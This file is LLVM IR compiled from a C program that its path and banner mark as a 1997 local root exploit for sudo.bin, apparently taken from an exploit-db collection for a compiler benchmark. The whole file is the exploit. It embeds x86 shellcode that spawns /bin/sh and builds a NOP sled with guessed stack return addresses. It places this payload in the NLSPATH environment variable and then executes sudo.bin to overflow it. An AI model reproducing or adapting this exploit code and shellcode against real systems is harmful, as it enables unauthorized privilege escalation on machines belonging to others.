; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_319.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_319.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.execshell = private unnamed_addr constant [51 x i8] c"\EB$^\8D\1E\89^\0B3\D2\89V\07\89V\0F\B8\1BV4\125\10V4\12\8DN\0B\8B\D1\CD\803\C0@\CD\80\E8\D7\FF\FF\FF/bin/sh\00", align 16
@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"can't allocate memory\0A\00", align 1
@BUFFER_SIZE = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [42 x i8] c"SUDO.BIN exploit coded by _PHANTOM_ 1997\0A\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"NLSPATH\00", align 1
@PATH_SUDO = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [9 x i8] c"sudo.bin\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"bash\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [51 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = bitcast [51 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([51 x i8], [51 x i8]* @__const.main.execshell, i32 0, i32 0), i64 51, i1 false)
  store i8* null, i8** %7, align 8
  store i64* null, i64** %8, align 8
  store i8* null, i8** %9, align 8
  %13 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %13, i32* %11, align 4
  %14 = call i8* @malloc(i32 4096)
  store i8* %14, i8** %7, align 8
  %15 = load i8*, i8** %7, align 8
  %16 = icmp ne i8* %15, null
  br i1 %16, label %20, label %17

17:                                               ; preds = %2
  %18 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 @exit(i32 0) #4
  unreachable

20:                                               ; preds = %2
  %21 = load i8*, i8** %7, align 8
  store i8* %21, i8** %9, align 8
  %22 = load i8*, i8** %9, align 8
  %23 = load i64, i64* @BUFFER_SIZE, align 8
  %24 = getelementptr inbounds [51 x i8], [51 x i8]* %6, i64 0, i64 0
  %25 = call i32 @strlen(i8* %24)
  %26 = sext i32 %25 to i64
  %27 = sub nsw i64 %23, %26
  %28 = call i32 @memset(i8* %22, i32 144, i64 %27)
  %29 = load i64, i64* @BUFFER_SIZE, align 8
  %30 = getelementptr inbounds [51 x i8], [51 x i8]* %6, i64 0, i64 0
  %31 = call i32 @strlen(i8* %30)
  %32 = sext i32 %31 to i64
  %33 = sub nsw i64 %29, %32
  %34 = load i8*, i8** %9, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 %33
  store i8* %35, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %36

36:                                               ; preds = %48, %20
  %37 = load i32, i32* %10, align 4
  %38 = getelementptr inbounds [51 x i8], [51 x i8]* %6, i64 0, i64 0
  %39 = call i32 @strlen(i8* %38)
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

41:                                               ; preds = %36
  %42 = load i32, i32* %10, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [51 x i8], [51 x i8]* %6, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = load i8*, i8** %9, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %9, align 8
  store i8 %45, i8* %46, align 1
  br label %48

48:                                               ; preds = %41
  %49 = load i32, i32* %10, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %10, align 4
  br label %36

51:                                               ; preds = %36
  %52 = load i8*, i8** %9, align 8
  %53 = bitcast i8* %52 to i64*
  store i64* %53, i64** %8, align 8
  store i32 0, i32* %10, align 4
  br label %54

54:                                               ; preds = %64, %51
  %55 = load i32, i32* %10, align 4
  %56 = icmp slt i32 %55, 2
  br i1 %56, label %57, label %67

57:                                               ; preds = %54
  %58 = call i32 (...) @get_esp()
  %59 = load i32, i32* %11, align 4
  %60 = add nsw i32 %58, %59
  %61 = sext i32 %60 to i64
  %62 = load i64*, i64** %8, align 8
  %63 = getelementptr inbounds i64, i64* %62, i32 1
  store i64* %63, i64** %8, align 8
  store i64 %61, i64* %62, align 8
  br label %64

64:                                               ; preds = %57
  %65 = load i32, i32* %10, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %10, align 4
  br label %54

67:                                               ; preds = %54
  %68 = load i64*, i64** %8, align 8
  %69 = bitcast i64* %68 to i8*
  store i8* %69, i8** %9, align 8
  %70 = load i8*, i8** %9, align 8
  store i8 0, i8* %70, align 1
  %71 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0))
  %72 = load i8*, i8** %7, align 8
  %73 = call i32 @setenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* %72, i32 1)
  %74 = load i32, i32* @PATH_SUDO, align 4
  %75 = call i32 @execl(i32 %74, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32* null)
  %76 = load i32, i32* %3, align 4
  ret i32 %76
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @printf(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i64) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @get_esp(...) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @execl(i32, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
